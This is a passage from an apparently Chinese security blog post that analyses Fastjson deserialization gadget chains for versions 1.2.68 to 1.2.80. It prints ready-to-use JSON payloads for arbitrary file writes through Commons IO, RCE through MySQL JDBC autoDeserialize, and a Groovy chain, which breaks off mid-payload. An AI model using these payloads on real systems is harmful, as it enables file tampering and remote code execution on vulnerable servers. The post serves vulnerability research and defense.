class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span><span class="number">1024</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/pwned&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>层层包装，使用TeeInputStream作为连接输入流和输出流的桥梁</p>
<p>大致过程就是：</p>
<ol>
<li>XmlStreamReader的构造函数触发read，然后用TeeInputStream进行read，TeeInputStream又用ReaderInputStream进行read，ReaderInputStream又用CharSequenceReader从字符序列中进行read</li>
<li>在TeeInputStream中的read方法中，read完之后会调用write进行写入，也就是调用WriterOutputStream进行write，WriterOutputStream又用FileWriterWithEncoding进行write</li>
</ol>
<p>流程图如下：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211035395.png" alt="image-20230321103534302"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211036870.png" alt="image-20230321103606777"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211036786.png" alt="image-20230321103626730"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211037994.png" alt="image-20230321103738928"></p>
<p>循环读取</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211038259.png" alt="image-20230321103835207"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211039713.png" alt="image-20230321103900619"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211039883.png" alt="image-20230321103953821"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211040836.png" alt="image-20230321104033736"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211042772.png" alt="image-20230321104209689"></p>
<p>从字节序列中取，然后返回</p>
<p>返回到TeeInputStream的read方法中，然后进行write</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211038259.png" alt="image-20230321103835207"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211045965.png" alt="image-20230321104535884"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211046571.png" alt="image-20230321104600491"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211046385.png" alt="image-20230321104613329"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211049568.png" alt="image-20230321104909502"></p>
<p>然后进行文件写入</p>
<p>这里面有两个个细节：</p>
<ol>
<li><code>&quot;charSequence&quot;:&#123;&quot;@type&quot;:&quot;java.lang.String&quot;&quot;aaaaaa&quot;&#125;</code>对于这种畸形JSON，仍然能解析</li>
<li>执行该POC后虽然文件能创建但是无法写入</li>
</ol>
<p>因为我懒，直接贴原作者的图进行解释</p>
<p>原文链接<a href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析</a>（以下部分为引用）</p>
<hr>
<p>当要写入的字符串长度不够时，输出的内容会被保留在 ByteBuffer 中，不会被实际输出到文件里</p>
<p><code>sun.nio.cs.StreamEncoder#implWrite</code></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211054542.png" alt="图片"></p>
<p>问题搞清楚了，我们需要写入足够长的字符串才会让它刷新 buffer，写入字节到输出流对应的文件里。那么很自然地想到，在 charSequence 处构造超长字符串是不是就可以了？</p>
<p>可惜并非如此，原因是 InputStream buffer 的长度大小在这里已经是固定的 4096 了：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211056660.png" alt="图片"></p>
<p>也就是说每次读取或者写入的字节数最多也就是 4096，但 Writer buffer 大小默认是 8192：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211056000.png" alt="图片"></p>
<p>因此仅仅一次写入在没有手动执行 flush 的情况下是无法触发实际的字节写入的。</p>
<hr>
<p>可以使用$ref引用同一个对象进行循环写入</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span><span class="number">1024</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;D:/tmp/pwned&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;trigger&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;trigger2&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;trigger3&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>XmlStreamReader在构造器方法会触发doRawStream()方法，在doRawStream()方法中触发getBOMCharsetName()，在getBOMCharsetName()中触发getBOM()，getBOM()触发TeeInputStream的read()方法，此时TeeInputStream为同一个对象（因为引用了上一个对象），就可以达循环读写。</p>
<p>该思路引导了很多人使用该库进行其他方式的利用</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;delegate&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"> 		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.codec.binary.Base64InputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;in&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.CharSequenceInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;charset&quot;</span><span class="punctuation">:</span><span class="string">&quot;utf-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;s&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;input your content&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;doEncode&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;lineLength&quot;</span><span class="punctuation">:</span><span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;lineSeparator&quot;</span><span class="punctuation">:</span><span class="string">&quot;5ZWKCg==&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;decodingPolicy&quot;</span><span class="punctuation">:</span><span class="number">0</span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;targetPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;./1.txt&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;include&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;boms&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span><span class="string">&quot;input your bytes&quot;</span>             </span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.bom&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>这个很巧妙使用了$ref，<code>$.bom</code>获取根对象的bom属性，根对象为BOMInputStream</p>
<p>这可以循环调用，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取班级下的学生的姓名</span><br><span class="line">new Classes().getStudent().getName()</span><br><span class="line">假设根对象为班级，对应JSONPath为</span><br><span class="line">$.student.name</span><br></pre></td></tr></table></figure>

<p>JSONPath会进行分段，段有很多类型</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211221800.png" alt="image-20230321122125728"></p>
<p>这里对应的是属性段PropertySegment，将$.student.name分成两个PropertySegment对象，一个是代表student属性的PropertySegment对象，第二个是代表name属性的PropertySegment对象；然后会遍历每个段调用eval方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211224247.png" alt="image-20230321122430164"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211225091.png" alt="image-20230321122553033"></p>
<p>获取属性值，会调用该属性的getter方法</p>
<p>所以$.bom会调用getBOM()方法触发利用链进行读取</p>
<p>还有使用Mysql进行SSRF和反序列化漏洞攻击的</p>
<h3 id="使用mysql-connector-java库"><a href="#使用mysql-connector-java库" class="headerlink" title="使用mysql-connector-java库"></a>使用mysql-connector-java库</h3><p>SSRF没太大用，这里不说，利用反序列化漏洞可以RCE，但是需要依赖对应java应用程序需要有相关的链</p>
<h4 id="Mysql-JDBC反序列化攻击"><a href="#Mysql-JDBC反序列化攻击" class="headerlink" title="Mysql JDBC反序列化攻击"></a>Mysql JDBC反序列化攻击</h4><p>当我们控制了连接数据库的字符串时，我们可以伪造一个数据库，将需要反序列化的恶意对象存储在BLOB类型的字段中，当客户端获取该BLOB类型的数据时会自动反序列化造成RCE</p>
<p>github上有fake mysql server配合该poc进行RCE</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//&lt;=1.2.68 and mysql 8.0.19可反序列化 &gt;8.0.19可SSRF</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;proxy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;connectionUrl&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;masters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;slaves&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;dbname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dbname&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pass&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;queryInterceptors&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;autoDeserialize&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>类似的还有PostgreSQL JDBC RCE</p>
<h3 id="SafeMode"><a href="#SafeMode" class="headerlink" title="SafeMode"></a>SafeMode</h3><p>在1.2.68存在safemode</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211603670.png" alt="image-20230321160314550"></p>
<p>默认为关闭，只要开启会直接抛出异常，不解析@type指定的JSON字符串</p>
<h2 id="1-2-69-lt-x3D-fastjson-lt-x3D-1-2-80"><a href="#1-2-69-lt-x3D-fastjson-lt-x3D-1-2-80" class="headerlink" title="1.2.69&lt;&#x3D;fastjson&lt;&#x3D;1.2.80"></a>1.2.69&lt;&#x3D;fastjson&lt;&#x3D;1.2.80</h2><p>在1.2.69中</p>
<p>在ParserConfig的checkAutoType中，若expectClass为AutoCloseable，则设置expectClassFlag为false，导致AutoCloseable为首的利用链都无法使用</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303211714260.png" alt="image-20230321171426139"></p>
<p>加的这三个expectHash为java.lang.Runnable、java.lang.Readable和java.lang.AutoCloseable</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201444419.png" alt="image-20230320144417368"></p>
<p>虽然JavaBeanDeserializer这条路走不通，但是仍然可以走ThrowableDeserializer这条路</p>
<h3 id="使用groovy库"><a href="#使用groovy库" class="headerlink" title="使用groovy库"></a>使用groovy库</h3><p>这个适用于1.2.76~1.2.80，为啥1.2.76以下不适用呢？后面会说</p>
<p>网上的payload是：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//两次parse</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.CompilationFailedException&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;unit&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.ProcessingUnit&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;</span><span class="punctuation">,</span></span><br><span 